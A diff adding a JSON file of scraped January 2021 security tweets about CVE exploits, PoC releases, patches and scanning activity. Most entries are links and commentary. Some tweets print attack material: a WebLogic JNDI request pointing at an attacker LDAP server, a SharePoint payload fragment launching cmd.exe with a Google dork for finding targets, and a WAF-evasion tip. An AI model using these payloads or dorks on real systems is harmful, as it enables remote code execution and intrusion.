@@ -1,0 +1,479 @@
+{
+    "expanded_url": [
+        "https://gist.github.com/testanull/e9ba06d0c0c403402f6941fe2dbb868a"
+    ],
+    "tweetfavorites": 109,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 51,
+    "tweettext": "poc of CVE-2020-4888 IBM Qradar siem deserialization to rce · GitHub https://t.co/9CvMi6SJil",
+    "tweettime": "2021-01-31, 10:51:13",
+    "tweeturl": "https://twitter.com/Securityblog/status/1355830993928777729",
+    "username": "Securityblog"
+}
+{
+    "expanded_url": [
+        "https://github.com/OpenTSDB/opentsdb/issues/2051"
+    ],
+    "tweetfavorites": 186,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 70,
+    "tweettext": "Poc RCE Opentsdb (CVE-2020-35476) 🔥🔥\n\nRefrence:https://t.co/ZaJWQ8CUsD https://t.co/Pfl2icA65a",
+    "tweettime": "2021-01-30, 19:38:12",
+    "tweeturl": "https://twitter.com/sec715/status/1355601224674942976",
+    "username": "sec715"
+}
+{
+    "expanded_url": [
+        "https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156"
+    ],
+    "tweetfavorites": 1471,
+    "tweetquotes": 23,
+    "tweetreplies": 26,
+    "tweetretweets": 502,
+    "tweettext": "My exploit for sudo CVE-2021-3156 that ACTUALLY works. Tested on ubuntu 18.04 and 20.04.\nhttps://t.co/d6pE5dVBWJ https://t.co/7KhsRjy24s",
+    "tweettime": "2021-01-30, 12:13:33",
+    "tweeturl": "https://twitter.com/r4j0x00/status/1355489323794108417",
+    "username": "r4j0x00"
+}
+{
+    "tweetfavorites": 457,
+    "tweetquotes": 5,
+    "tweetreplies": 12,
+    "tweetretweets": 25,
+    "tweettext": "After 3 days of non-stop debugging, I am proud to announce my exploit PoC for CVE-2021-3156 (sudo heap overflow) still does not work.",
+    "tweettime": "2021-01-29, 23:37:39",
+    "tweeturl": "https://twitter.com/gf_256/status/1355299098543452160",
+    "username": "gf_256"
+}
+{
+    "expanded_url": [
+        "https://sysdig.com/blog/cve-2021-3156-sudo-falco/",
+        "https://github.com/falcosecurity/falco",
+        "https://sysdig.com/blog/rinbot-discord-bot-crypto-miner/"
+    ],
+    "tweetfavorites": 66,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 13,
+    "tweettext": "How to detect sudo’s CVE-2021-3156 using Falco : https://t.co/N0k0KVZRKo \n\nfalco : Cloud Native Runtime Security : https://t.co/j9e8p9QMH5\n\nDetecting malware dk86 with Falco and Sysdig : https://t.co/WXqhto4Spb credits @sysdig",
+    "tweettime": "2021-01-29, 13:41:58",
+    "tweeturl": "https://twitter.com/binitamshah/status/1355149186073825286",
+    "username": "binitamshah"
+}
+{
+    "tweetfavorites": 38,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 12,
+    "tweettext": "let's assume @pwn_expoit is right and they used CVE-2020-15994 as part of their exploit chain.  I reported the bug in August and at the time it was clear the issue existed in the code for some time, at least through Chrome 78 (2019)",
+    "tweettime": "2021-01-28, 18:47:37",
+    "tweeturl": "https://twitter.com/spoofyroot/status/1354863719692390401",
+    "username": "spoofyroot"
+}
+{
+    "tweetfavorites": 276,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 89,
+    "tweettext": "#CVE-2021-2109 Weblogic Server Remote Code Execution involving JNDI, another gadget.\n\n1. Hide Command in HTTP Request Header to evade WAF detection.\n\n2. Retrieve positive information from HTTP Response to make sure the vulnerability exists. https://t.co/i9BpimfIDt",
+    "tweettime": "2021-01-27, 09:59:45",
+    "tweeturl": "https://twitter.com/pyn3rd/status/1354368489553686533",
+    "username": "pyn3rd"
+}
+{
+    "tweetfavorites": 87,
+    "tweetquotes": 3,
+    "tweetreplies": 5,
+    "tweetretweets": 24,
+    "tweettext": "The attacker may post a paper on the Blog to analyze the 0day(CVE-2020-15994) vulnerability used by himself! https://t.co/yJLW0rZuBG",
+    "tweettime": "2021-01-27, 09:09:40",
+    "tweeturl": "https://twitter.com/rayh4c/status/1354355884302897155",
+    "username": "rayh4c"
+}
+{
+    "expanded_url": [
+        "https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt",
+        "https://vimeo.com/504872555",
+        "https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit"
+    ],
+    "tweetfavorites": 71,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 54,
+    "tweettext": "Heap-based buffer overflow in Sudo (CVE-2021-3156) - obtained full root privileges on Ubuntu 20.04 (Sudo 1.8.31), Debian 10 (Sudo 1.8.27), and Fedora 33 (Sudo 1.9.2) : https://t.co/QgXtc5TECP\n\nDemo : https://t.co/zJvY9zSKZO\n\nMore : https://t.co/bHFuUrCbgG",
+    "tweettime": "2021-01-27, 01:51:57",
+    "tweeturl": "https://twitter.com/binitamshah/status/1354245732157546502",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "http://packetstormsecurity.com/files/161053/Oracle-WebLogic-Server-14.1.1.0-Remote-Code-Execution.html"
+    ],
+    "tweetfavorites": 111,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 53,
+    "tweettext": "#Oracle WebLogic Server RCE (CVE-2021-2109)\n\n[PoC]\nGET /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(-ldap://192.168.0;[Semicolon]👈10:1389/5r5mu7;AdminServer-)\n\nhttps://t.co/S875IxhzFa https://t.co/h2REYhG9Yj",
+    "tweettime": "2021-01-25, 04:49:45",
+    "tweeturl": "https://twitter.com/wugeej/status/1353565699864633344",
+    "username": "wugeej"
+}
+{
+    "tweetfavorites": 54,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 35,
+    "tweettext": "Mass scanning activity detected from 81.218.45.224 (🇮🇱) targeting Fortinet VPN servers vulnerable to unauthenticated arbitrary file read (CVE-2018-13379) leading to disclosure of usernames and passwords in plaintext. #threatintel https://t.co/9HCNq52ypj",
+    "tweettime": "2021-01-24, 21:44:32",
+    "tweeturl": "https://twitter.com/bad_packets/status/1353458688942432262",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://github.com/chipik/SAP_EEM_CVE-2020-6207/blob/main/README.md"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 19,
+    "tweettext": "Here's a PoC to exploit missing authentication checks (CVE-2020-6207) in SAP EEM servlet, leading to RCE on SAP SMDAgents connected to SAP Solution Manager.\n\nhttps://t.co/rnLkFDemrd\n\nvia @_chipik https://t.co/ZS6rLMBjnL",
+    "tweettime": "2021-01-24, 19:05:42",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1353418716915003397",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/SNCKER/CVE-2021-3129"
+    ],
+    "tweetfavorites": 31,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 6,
+    "tweettext": "اگر از #لاراول نسخه 8.4.3 پایین تر استفاده می کنید و Debug روشن است به خاطر استفاده نادرست لاراول از file_get_contents() و file_put_contents() هکر می تواند به سرور شما دسترسی پیدا کند!\nبرای رفع کافیست به آخرین نسخه لاراول ارتقا انجام شود.\nکد: CVE-2021-3129\nhttps://t.co/go3lWSLqq6",
+    "tweettime": "2021-01-24, 15:47:37",
+    "tweeturl": "https://twitter.com/vahidnameni/status/1353368870908616705",
+    "username": "vahidnameni"
+}
+{
+    "expanded_url": [
+        "https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html"
+    ],
+    "tweetfavorites": 422,
+    "tweetquotes": 9,
+    "tweetreplies": 2,
+    "tweetretweets": 149,
+    "tweettext": "TL;DR: This is the story of how a researcher found and exploited CVE-2020-168751, a remote code execution vulnerability in Exchange Online and bypassed two different patches for the vulnerability\n\nhttps://t.co/sgjl0nzV3i https://t.co/vtCz791E4j",
+    "tweettime": "2021-01-24, 07:08:00",
+    "tweeturl": "https://twitter.com/campuscodi/status/1353238102354108418",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation",
+        "https://github.com/tabbysable/POC-2020-8558"
+    ],
+    "tweetfavorites": 31,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 13,
+    "tweettext": "Write-up on CVE-2020-8558, aka Bad Pods, a Kubernetes pod privilege escalation\n\nhttps://t.co/wHrlkAU8S3\n\nPoC here: https://t.co/unzotLOZJJ https://t.co/YmvzriZFZj",
+    "tweettime": "2021-01-21, 09:30:00",
+    "tweeturl": "https://twitter.com/campuscodi/status/1352186676655890432",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://blog.br0vvnn.io/pages/blogpost.aspx?id=5"
+    ],
+    "tweetfavorites": 317,
+    "tweetquotes": 2,
+    "tweetreplies": 7,
+    "tweetretweets": 129,
+    "tweettext": "WebAssembly Engine Is a Good Attack Surface for Chrome\n\nMy first post for 2021:  https://t.co/4ZqDMKK9xZ\n\nA detailed write-up for exploiting CVE-2020-15994 Chrome WebAssembly UAF vulnerability\n\n#chrome #exploit #security #vulnerability",
+    "tweettime": "2021-01-20, 12:25:29",
+    "tweeturl": "https://twitter.com/z0x55g/status/1351868447781695488",
+    "username": "z0x55g"
+}
+{
+    "expanded_url": [
+        "https://elongl.github.io/exploitation/2021/01/08/cve-2014-3153.html"
+    ],
+    "tweetfavorites": 47,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 19,
+    "tweettext": "Exploiting CVE-2014-3153 (Towelroot) : https://t.co/9KUktVw5zy credits @elongli https://t.co/AeRpKFhRMG",
+    "tweettime": "2021-01-19, 14:35:06",
+    "tweeturl": "https://twitter.com/binitamshah/status/1351538678724640770",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://bit.ly/2N65StI"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 15,
+    "tweettext": "(CVE-2021-3113) Authentication Bypass and Root User Add #0day that I discovered during the penetration test in Netsia SEBA+ is now public.The #vulnerability can be exploited with the #metasploit auxiliary module I prepared. Details on my personal blog https://t.co/bxTR1Upr1Z https://t.co/Y2WL1g8U1i",
+    "tweettime": "2021-01-18, 09:00:09",
+    "tweeturl": "https://twitter.com/ehakkus/status/1351092000511184897",
+    "username": "ehakkus"
+}
+{
+    "tweetfavorites": 33,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 16,
+    "tweettext": "Ongoing mass scanning activity detected from 185.191.32.178 (🇷🇺) targeting Fortinet VPN servers vulnerable to unauthenticated arbitrary file read (CVE-2018-13379) leading to disclosure of usernames and passwords in plaintext. #threatintel https://t.co/krXuIpLYGG",
+    "tweettime": "2021-01-16, 21:43:15",
+    "tweeturl": "https://twitter.com/bad_packets/status/1350559265631571974",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://blog.cybercastle.io/weblogic-remote-code-execution-exploiting-cve-2019-2725/"
+    ],
+    "tweetfavorites": 111,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 53,
+    "tweettext": "Weblogic Remote Code Execution Exploiting CVE-2019-2725 https://t.co/8a62AvkNpA  #Pentesting #WebSecurity #RCE #Exploit #Infosec https://t.co/gSmm8EChcp",
+    "tweettime": "2021-01-15, 15:32:18",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1350103523053232131",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/published/"
+    ],
+    "tweetfavorites": 93,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "Just published: 5 advisories in #SolarWinds, including 2 RCE bugs fixed in CVE-2020-14005, which has been publicly linked with #SunBurst. Other bugs are privilege escalation, info disclosure, and arbitrary file creation. https://t.co/LnQUrpwkLS",
+    "tweettime": "2021-01-14, 17:18:34",
+    "tweeturl": "https://twitter.com/thezdi/status/1349767878720028679",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://github.com/chipik/SAP_EEM_CVE-2020-6207"
+    ],
+    "tweetfavorites": 185,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 85,
+    "tweettext": "RCE PoC for CVE-2020-6207 (Missing Authentication Check in SAP Solution Manager)\n\nhttps://t.co/PVg72190wM https://t.co/enoqzKEVTv",
+    "tweettime": "2021-01-14, 13:41:16",
+    "tweeturl": "https://twitter.com/_chipik/status/1349713193443209216",
+    "username": "_chipik"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2021/01/microsoft-issues-patches-for-defender.html"
+    ],
+    "tweetfavorites": 196,
+    "tweetquotes": 10,
+    "tweetreplies": 3,
+    "tweetretweets": 147,
+    "tweettext": "~~ Patch Tuesday, Jan 2021 ~~\n\n#Microsoft releases Windows updates to patch a total of 83 newly discovered security flaws, including an actively exploited zero-day RCE #vulnerability affecting Defender (CVE-2021-1647) application.\n\nhttps://t.co/IuW3s7ubiF\n\n#infosec #cybersecurity",
+    "tweettime": "2021-01-13, 05:12:49",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1349222849362317313",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/12/zero-click-wormable-rce-vulnerability.html#:~:text=Zero%2DClick%20Wormable%20RCE%20Vulnerability%20Reported%20in%20Microsoft%20Teams,-%EE%A0%82December%2007&text=Microsoft%20did%20not%20assign%20a,automatically%20updates%20without%20user's%20interaction.%22"
+    ],
+    "tweetfavorites": 40,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 9,
+    "tweettext": "Hey, for CVE-2021-1647 - I thought if a product auto-updates Microsoft doesn't deem that worth a CVE???\n\nhttps://t.co/qPoH8QI2zn",
+    "tweettime": "2021-01-12, 22:28:02",
+    "tweeturl": "https://twitter.com/jfslowik/status/1349120985195106304",
+    "username": "jfslowik"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1647"
+    ],
+    "tweetfavorites": 323,
+    "tweetquotes": 14,
+    "tweetreplies": 5,
+    "tweetretweets": 164,
+    "tweettext": "One 0-day from today's Microsoft Patch Tuesday is marked as exploited in the wild: CVE-2021-1647, a RCE in Microsoft Defender. https://t.co/Nnz5z0kCun",
+    "tweettime": "2021-01-12, 20:06:54",
+    "tweeturl": "https://twitter.com/maddiestone/status/1349085464754409472",
+    "username": "maddiestone"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1647"
+    ],
+    "tweetfavorites": 177,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 64,
+    "tweettext": "CVE-2021-1647 - Windows Defender RCE\n\nVector: Local\nExploitation Assessment: Exploitation detected\n\nhttps://t.co/LHw2SdR2Lt",
+    "tweettime": "2021-01-12, 18:42:14",
+    "tweeturl": "https://twitter.com/buherator/status/1349064159464448000",
+    "username": "buherator"
+}
+{
+    "expanded_url": [
+        "https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html"
+    ],
+    "tweetfavorites": 841,
+    "tweetquotes": 17,
+    "tweetreplies": 12,
+    "tweetretweets": 388,
+    "tweettext": "A story on how I gained RCE against Microsoft Exchange Online using CVE-2020-16875 and bypassed their patches twice over. Latest patch bypass is unpatched against on-premise deployments!\n\nMaking Clouds Rain - Remote Code Execution in Microsoft Office 365: https://t.co/HqVQTRCYF6",
+    "tweettime": "2021-01-12, 18:20:47",
+    "tweeturl": "https://twitter.com/steventseeley/status/1349058761370071041",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/microsoft-fixes-defender-zero-day-in-january-2021-patch-tuesday/"
+    ],
+    "tweetfavorites": 58,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 32,
+    "tweettext": "Microsoft fixes Windows Defender zero-day in January 2021 Patch Tuesday (CVE-2021-1647)\n\n-82 other bugs also fixed this month\n-this includes a patch for CVE-2021-1648, a Windows EoP bug disclosed by ZDI last month\n\nhttps://t.co/wnP0fML0zO https://t.co/Q13Q9OLWBG",
+    "tweettime": "2021-01-12, 18:19:30",
+    "tweeturl": "https://twitter.com/campuscodi/status/1349058436907073536",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://github.com/rapid7/metasploit-framework/pull/14585"
+    ],
+    "tweetfavorites": 123,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 54,
+    "tweettext": "Metasploit module for CVE-2020-17136 has now been landed. Allows for LPE on Windows 10 1803 and later. Features a (as far as I am aware) new DLL hijack that I found using the healthapi.dll DLL and the Microsoft Storage Spaces SMP service https://t.co/AGCKoxNKB7",
+    "tweettime": "2021-01-12, 05:03:00",
+    "tweeturl": "https://twitter.com/tekwizz123/status/1348857992695963649",
+    "username": "tekwizz123"
+}
+{
+    "expanded_url": [
+        "https://www.secura.com/uploads/whitepapers/Zerologon.pdf",
+        "https://www.exploit-db.com/docs/49368"
+    ],
+    "tweetfavorites": 60,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 24,
+    "tweettext": "Zerologon : Instantly Become Domain Admin by Subverting Netlogon Cryptography (CVE-2020-1472) : https://t.co/BgyDYgJgda \n\nMore --&gt; Understanding &amp; Exploiting Zerologon : https://t.co/p28eWUjlzu",
+    "tweettime": "2021-01-11, 16:46:48",
+    "tweeturl": "https://twitter.com/binitamshah/status/1348672721790541824",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://github.com/ChiChou/sploits/tree/master/CVE-2020-9979"
+    ],
+    "tweetfavorites": 43,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 7,
+    "tweettext": "In case you are looking for it, here's the sandbox escape PoC for CVE-2020-9979 (patched before macOS 10.15 dev)\nhttps://t.co/ca0YJFtPi6 It won't compile because the WebKit exploit and shellcode MachO loader are not included",
+    "tweettime": "2021-01-10, 07:46:11",
+    "tweeturl": "https://twitter.com/CodeColorist/status/1348174280836583434",
+    "username": "CodeColorist"
+}
+{
+    "expanded_url": [
+        "https://github.com/ch1nghz/CVE-2020-11851"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 22,
+    "tweettext": "CVE-2020-11851 Remote Code Execution vulnerability on ArcSight Logger  https://t.co/TaASz7HhXO #Pentesting #RCE #Vulnerability #CyberSecurity #Infosec https://t.co/HQjZwFRIcS",
+    "tweettime": "2021-01-09, 15:31:45",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1347929059322441729",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://blog.zecops.com/vulnerabilities/ntfs-remote-code-execution-cve-2020-17096-analysis/"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 11,
+    "tweettext": "NTFS Remote Code Execution (CVE-2020-17096) Analysis  https://t.co/0tyZqwYp8g  #Pentesting #RCE #Vulnerability #Exploit #CyberSecurity #Infosec https://t.co/WAIoPMYrVp",
+    "tweettime": "2021-01-07, 04:47:23",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1347042122554339328",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://www.fortiguard.com/psirt?date=01-2021"
+    ],
+    "tweetfavorites": 549,
+    "tweetquotes": 17,
+    "tweetreplies": 4,
+    "tweetretweets": 252,
+    "tweettext": "A swarm of FortiWeb CVE-s is here:\n\n1️⃣Unauth SQL Injection (CVE-2020-29015)\n2️⃣Unauth Buffer Overflow (CVE-2020-29016)\n3️⃣Unauth Buffer Overflow (CVE-2020-29019)\n4️⃣Format String (CVE-2020-29018)\n\nAttributed to: Andrey Medov\n\nAdvisories: https://t.co/TwDduMauXc https://t.co/BTSMJki2ld",
+    "tweettime": "2021-01-06, 13:12:54",
+    "tweeturl": "https://twitter.com/ptswarm/status/1346806951326396416",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://blog.zecops.com/vulnerabilities/ntfs-remote-code-execution-cve-2020-17096-analysis/"
+    ],
+    "tweetfavorites": 63,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 27,
+    "tweettext": "NTFS Remote Code Execution (CVE-2020-17096) Analysis:\n\nhttps://t.co/QeH0EuzRQu\n\n#exploitation #windows #ntfs #cybersecurity https://t.co/7cTlb5RvpI",
+    "tweettime": "2021-01-06, 06:20:50",
+    "tweeturl": "https://twitter.com/ale_sp_brazil/status/1346703252507787264",
+    "username": "ale_sp_brazil"
+}
+{
+    "expanded_url": [
+        "https://blog.zecops.com/vulnerabilities/ntfs-remote-code-execution-cve-2020-17096-analysis/"
+    ],
+    "tweetfavorites": 243,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 102,
+    "tweettext": "NTFS Remote Code Execution (CVE-2020-17096) Analysis - ZecOps Blog https://t.co/RvjL9lEEtZ",
+    "tweettime": "2021-01-05, 20:51:08",
+    "tweeturl": "https://twitter.com/ZecOps/status/1346559882825064450",
+    "username": "ZecOps"
+}
+{
+    "expanded_url": [
+        "https://www.mdsec.co.uk/2020/01/code-injection-in-workflows-leading-to-sharepoint-rce-cve-2020-0646/?fbclid=IwAR0b4QZxdQKVYN-ES62rdt9yN5MMzfgpK7DkdkbIq44Flm-ODiuqzeIglUQ"
+    ],
+    "tweetfavorites": 418,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 179,
+    "tweettext": "CVE-2020-0646 SharePoint RCE\n\nPoC\nCallExternalMethodActivity x:Name=\"foo\" \n....System.Diagnostics.Process.Start(\"cmd.exe\",\n\nGoogle Dork\n.sharepoint.com/_vti_bin/webpartpages/asmx -docs -msdn -mdsec\n\nhttps://t.co/DRGcSRZ6Co https://t.co/w1OI4ADbbJ",
+    "tweettime": "2021-01-05, 06:49:15",
+    "tweeturl": "https://twitter.com/wugeej/status/1346348017389998081",
+    "username": "wugeej"
+}
+{
+    "tweetfavorites": 36,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 4,
+    "tweettext": "@IanColdwater Drops CVE-2021-0231 A Twitter RCE via timing attack thus extending February to 31 days.\n\nSo far it appears this exploit POC has been very successful.\n\n😂😂\n\n❤️ Ian you deserve to be verified. Here's hoping it happens this year.",
+    "tweettime": "2021-01-04, 18:06:39",
+    "tweeturl": "https://twitter.com/Shadow0pz/status/1346156099750268931",
+    "username": "Shadow0pz"
+}
